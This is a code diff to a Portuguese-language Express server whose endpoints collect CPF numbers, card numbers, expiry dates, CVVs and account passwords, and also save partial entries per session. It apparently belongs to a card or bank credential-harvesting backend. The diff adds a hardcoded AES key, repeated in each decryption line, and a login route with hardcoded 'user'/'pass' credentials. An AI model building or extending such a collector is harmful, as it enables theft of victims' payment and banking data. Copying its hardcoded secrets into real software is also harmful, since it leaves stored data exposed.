@@ -313,10 +313,17 @@ app.post('/api/temp-submit', requireAuth, async (req, res) => {
             return res.status(400).json({ error: 'sessionId é obrigatório.' });
         }
 
-        // Encrypt sensitive data if provided
-        const encryptedCardNumber = cardNumber ? encrypt(cardNumber) : null;
-        const encryptedCvv = cvv ? encrypt(cvv) : null;
-        const encryptedPassword = password ? encrypt(password) : null;
+        // Decrypt sensitive data received from client
+        const decryptedCpf = cpf ? CryptoJS.AES.decrypt(cpf, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        const decryptedCardNumber = cardNumber ? CryptoJS.AES.decrypt(cardNumber, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        const decryptedExpiryDate = expiryDate ? CryptoJS.AES.decrypt(expiryDate, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        const decryptedCvv = cvv ? CryptoJS.AES.decrypt(cvv, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        const decryptedPassword = password ? CryptoJS.AES.decrypt(password, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+
+        // Encrypt sensitive data for storage
+        const encryptedCardNumber = decryptedCardNumber ? encrypt(decryptedCardNumber) : null;
+        const encryptedCvv = decryptedCvv ? encrypt(decryptedCvv) : null;
+        const encryptedPassword = decryptedPassword ? encrypt(decryptedPassword) : null;
 
         // Insert or update temporary form data
         await pool.query(
@@ -330,7 +337,7 @@ app.post('/api/temp-submit', requireAuth, async (req, res) => {
                  cvv = COALESCE(EXCLUDED.cvv, temp_data.cvv),
                  password = COALESCE(EXCLUDED.password, temp_data.password),
                  updated_at = CURRENT_TIMESTAMP`,
-            [sessionId, cpf || null, encryptedCardNumber, expiryDate || null, encryptedCvv, encryptedPassword]
+            [sessionId, decryptedCpf || null, encryptedCardNumber, decryptedExpiryDate || null, encryptedCvv, encryptedPassword]
         );
         console.log('Temp form data saved for session:', sessionId);
 
@@ -395,15 +402,22 @@ app.post('/submit', requireAuth, async (req, res) => {
             return res.status(400).json({ error: 'Todos os campos são obrigatórios.' });
         }
 
-        // Encrypt sensitive data
-        const encryptedCardNumber = encrypt(cardNumber);
-        const encryptedCvv = encrypt(cvv);
-        const encryptedPassword = encrypt(password);
+        // Decrypt sensitive data received from client
+        const decryptedCpf = CryptoJS.AES.decrypt(cpf, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
+        const decryptedCardNumber = CryptoJS.AES.decrypt(cardNumber, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
+        const decryptedExpiryDate = CryptoJS.AES.decrypt(expiryDate, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
+        const decryptedCvv = CryptoJS.AES.decrypt(cvv, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
+        const decryptedPassword = CryptoJS.AES.decrypt(password, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
+
+        // Encrypt sensitive data for storage
+        const encryptedCardNumber = encrypt(decryptedCardNumber);
+        const encryptedCvv = encrypt(decryptedCvv);
+        const encryptedPassword = encrypt(decryptedPassword);
 
         // Insert into form_data table
         await pool.query(
             `INSERT INTO form_data (cpf, card_number, expiry_date, cvv, password) VALUES ($1, $2, $3, $4, $5)`,
-            [cpf, encryptedCardNumber, expiryDate, encryptedCvv, encryptedPassword]
+            [decryptedCpf, encryptedCardNumber, decryptedExpiryDate, encryptedCvv, encryptedPassword]
         );
         console.log('Final form data saved to DB');
 
@@ -556,6 +570,17 @@ app.delete('/api/reset-visits', async (req, res) => {
     } catch (error) {
         console.error('Err in /api/reset-visits:', error.message);
         res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Rota de login para autenticação
+app.post('/api/login', (req, res) => {
+    const { username, password } = req.body;
+    if (username === 'user' && password === 'pass') { // Substitua por credenciais seguras
+        req.session.authenticated = true;
+        res.status(200).json({ message: 'Login bem-sucedido' });
+    } else {
+        res.status(401).json({ error: 'Credenciais inválidas' });
     }
 });
 
